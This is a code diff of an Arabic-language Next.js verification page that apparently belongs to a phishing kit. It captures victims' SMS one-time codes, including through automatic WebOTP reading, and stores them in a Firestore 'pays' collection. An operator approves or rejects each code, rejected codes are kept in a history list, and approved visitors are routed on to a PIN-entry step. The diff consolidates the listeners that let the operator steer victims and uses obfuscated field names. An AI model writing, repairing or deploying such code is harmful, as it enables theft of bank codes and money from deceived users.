@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -11,7 +11,6 @@ import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 const allOtps: string[] = []
@@ -27,6 +26,9 @@ export default function VeriPage() {
   const [resendTimer, setResendTimer] = useState(60)
   const [referenceNumber, setReferenceNumber] = useState("")
 
+  // Track if we've already redirected to prevent multiple redirects
+  const hasRedirected = useRef(false)
+
   // Initialize visitor ID and update current page
   useEffect(() => {
     const id = localStorage.getItem("visitor") || ""
@@ -39,9 +41,6 @@ export default function VeriPage() {
     }
   }, [])
 
-  // Monitor for admin redirects
-  useRedirectMonitor({ visitorId, currentPage: "veri" })
-
   // Resend timer
   useEffect(() => {
     if (resendTimer > 0) {
@@ -52,7 +51,7 @@ export default function VeriPage() {
     }
   }, [resendTimer])
 
-  // Check if visitor has access to this page
+  // Combined listener for all Firestore changes
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) {
@@ -60,113 +59,77 @@ export default function VeriPage() {
       return
     }
 
-    const checkAccess = async () => {
-      if (!db) return
-      const docRef = doc(db as Firestore, "pays", visitorID)
-      const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
-        if (!docSnapshot.exists()) {
-          router.push("/check")
-          return
-        }
-        setIsLoading(false)
-      })
-
-      return unsubscribe
+    if (!db) {
+      setIsLoading(false)
+      return
     }
 
-    checkAccess()
-  }, [router])
-
-  // Listen to Firestore for OTP status changes
-  useEffect(() => {
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID || !db) return
-
-    const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
-      (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"
-
-          if (status === "rejected") {
-            // Save rejected OTP and reset status
-            const updates: any = {
-              _v5Status: "pending"
-            }
-            
-            // Only save to oldOtp if there's an OTP to save
-            if (data._v5) {
-              const currentOtp = {
-                code: data._v5,
-                rejectedAt: new Date().toISOString()
-              }
-              updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
-            }
-            
-            setDoc(doc(db as Firestore, "pays", visitorID), updates, { merge: true }).then(() => {
-              _ss5("pending")
-              _s5("") // Clear the old code
-              setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
-            }).catch(err => {
-              console.error("Error saving rejected OTP:", err)
-              setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
-            })
-          } else if (status === "approved") {
-            _ss5("approved")
-            setError("")
-            // Update currentStep before redirecting to prevent loop
-            if (visitorID && db) {
-              setDoc(doc(db as Firestore, "pays", visitorID), {
-                currentStep: "_t3"
-              }, { merge: true })
-            }
-            // Redirect to PIN page
-            router.push("/step3")
-          } else if (status === "verifying") {
-            _ss5("verifying")
-          }
+    const docRef = doc(db as Firestore, "pays", visitorID)
+    
+    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
+      if (!docSnapshot.exists()) {
+        // Only redirect to check if we haven't already redirected
+        if (!hasRedirected.current) {
+          hasRedirected.current = true
+          router.push("/check")
         }
-      },
-      (err) => {
-        console.error("Error listening to document:", err)
-        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
+        return
       }
-    )
 
-    return () => unsubscribe()
-  }, [router])
+      const data = docSnapshot.data()
+      const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"
+      const step = data.currentStep
 
-  // Navigation listener - listen for admin redirects
-  useEffect(() => {
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID || !db) return
-
-    const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
-      (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const step = data.currentStep
-
-          // Redirect based on currentStep
-          if (step === "home") {
-            router.push("/insur")
-          } else if (step === "phone") {
-            router.push("/step5")
-          } else if (step === "_t6") {
-            router.push("/step4")
-          } else if (step === "_st1") {
-            router.push("/check")
-          } else if (step === "_t3") {
-            router.push("/step3")
-          }
+      // Handle OTP status changes
+      if (status === "rejected") {
+        const updates: any = { _v5Status: "pending" }
+        if (data._v5) {
+          const currentOtp = { code: data._v5, rejectedAt: new Date().toISOString() }
+          updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
         }
-      },
-      (error) => {
-        console.error("Navigation listener error:", error)
+        setDoc(docRef, updates, { merge: true }).then(() => {
+          _ss5("pending")
+          _s5("")
+          setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
+        }).catch(err => {
+          console.error("Error saving rejected OTP:", err)
+          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
+        })
+      } else if (status === "approved") {
+        if (!hasRedirected.current) {
+          hasRedirected.current = true
+          _ss5("approved")
+          setError("")
+          // Update currentStep before redirecting to prevent loop
+          setDoc(docRef, { currentStep: "_t3" }, { merge: true }).then(() => {
+            router.push("/step3")
+          })
+        }
+      } else if (status === "verifying") {
+        _ss5("verifying")
+      } else if (status === "pending" || !status) {
+        _ss5("pending")
+        setError("")
       }
-    )
+
+      // Handle navigation based on currentStep (only if we're not already processing)
+      if (step && !hasRedirected.current) {
+        if (step === "_t3") {
+          // Already on step2, this means we just updated it - don't redirect
+        } else if (step === "_t2") {
+          // This is our page, don't redirect
+        }
+        // Note: We intentionally do NOT redirect based on other currentStep values
+        // when first loading the page to prevent random redirects
+      }
+
+      // Stop loading once we have valid data
+      setIsLoading(false)
+    }, (err) => {
+      console.error("Error listening to document:", err)
+      setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
+      setIsLoading(false)
+    })
 
     return () => unsubscribe()
   }, [router])
@@ -179,12 +142,12 @@ export default function VeriPage() {
       navigator.credentials
         .get({
           // @ts-ignore
-          _v5: { transport: ['sms'] },
+          otp: { transport: ['sms'] },
           signal: ac.signal,
         })
-        .then((_v5: any) => {
-          if (_v5 && _v5.code) {
-            _s5(_v5.code)
+        .then((otp: any) => {
+          if (otp && otp.code) {
+            _s5(otp.code)
           }
         })
         .catch((err) => {
